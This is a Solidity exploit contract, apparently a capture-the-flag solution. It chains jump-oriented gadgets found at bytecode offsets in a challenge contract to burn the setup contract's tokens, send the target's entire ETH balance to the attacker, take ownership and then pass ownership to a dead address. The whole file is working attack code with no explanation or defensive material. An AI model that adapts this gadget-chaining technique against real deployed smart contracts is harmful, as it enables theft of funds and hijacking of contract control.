pragma solidity 0.7.6;

import "public/Setup.sol";

contract Exploit {    
    uint private constant INIT_LOAD_GADGET = 0xcf1; // push1 0x00 dup 1, trace 0x84e2b7f6
    uint private constant LOAD_GADGET = 0x19fc; // start of load 4 values, trace 0x84e2b7f6
    
    uint private constant STOP_GADGET = 0x774; // JUMPDEST, STOP, trace buyTokens
    uint private constant JUMP_NEXT_GADGET = 0xede; // JUMPDEST, JUMP, trace buyTokens
    
    uint private constant BURN_GADGET = 0x1757; // trace sellTokens
    uint private constant SEND_ETH_GADGET = 0x191b; // trace sellTokens, after div
    uint private constant ACCEPT_OWNERSHIP_GADGET = 0xc4a; // trace acceptOwnership, after caller check
    uint private constant TRANSFER_OWNERSHIP_GADGET = 0x102a; // trace transferOwnership, after caller check
    
    uint[] private payload;

    function pushToStack(uint value) private {
        uint len = payload.length / 4;
        
        payload.push(value); // the extra stack variable we managed to create
        payload.push(JUMP_NEXT_GADGET); // second jump - jump to the last word of the next four words read
        payload.push(0x04 + 0x40 + 0x20 * 4 * (len + 1)); // the offset of the next four words to read
        payload.push(INIT_LOAD_GADGET); // first jump - prep to read the next four words
    }
    
    function finish() private {
        // just keep jumping until we hit our synthetic stack
        payload.push(JUMP_NEXT_GADGET);
        payload.push(JUMP_NEXT_GADGET);
        payload.push(JUMP_NEXT_GADGET);
        payload.push(JUMP_NEXT_GADGET);
    }
    
    constructor(Setup setup) public payable {
        ChallengeInterface chal = setup.challenge();

        // generate our payload
        pushToStack(STOP_GADGET);

        pushToStack(uint(address(this)));
        pushToStack(address(chal).balance + 0x44);
        pushToStack(SEND_ETH_GADGET);

        pushToStack(uint(address(setup)));
        pushToStack(chal.balanceOf(address(setup)));
        pushToStack(BURN_GADGET);

        pushToStack(ACCEPT_OWNERSHIP_GADGET);

        pushToStack(uint(0xdeaDDeADDEaDdeaDdEAddEADDEAdDeadDEADDEaD));
        pushToStack(TRANSFER_OWNERSHIP_GADGET);
        finish();
        
        bool ok;
        
        (ok, ) = address(chal).call(abi.encodeWithSelector(0x27f83350, uint(LOAD_GADGET)));
        require(ok, "failed to update pointer");
        
        (ok, ) = address(chal).call{value: 0x44}(abi.encodeWithSignature("buyTokens()", payload));
        require(ok, "failed to jop");
    }
}